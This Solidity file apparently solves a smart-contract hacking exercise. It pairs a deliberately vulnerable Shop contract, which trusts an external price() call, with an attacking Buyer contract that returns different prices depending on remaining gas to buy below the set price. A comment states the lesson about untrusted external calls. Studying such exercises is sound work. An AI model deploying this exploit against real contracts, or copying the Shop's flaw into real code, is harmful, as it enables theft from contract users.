// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//interface Buyer {
//  function price() external view returns (uint);
//}

/*
    RESULT NOTE:
    Contracts can manipulate data seen by other contracts in any way they want.
    It's unsafe to change the state based on external and untrusted contracts logic.
 */
contract Buyer {
  event GasLeft(uint _value);

  function price() public view returns (uint) {
      // emit GasLeft(gasleft());
      if (gasleft() > 10000) {
          return 110;
      } 
      return 10;
  }
  
  function buy(address _shop) public {
      Shop(_shop).buy{gas: 1000000}();
  }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
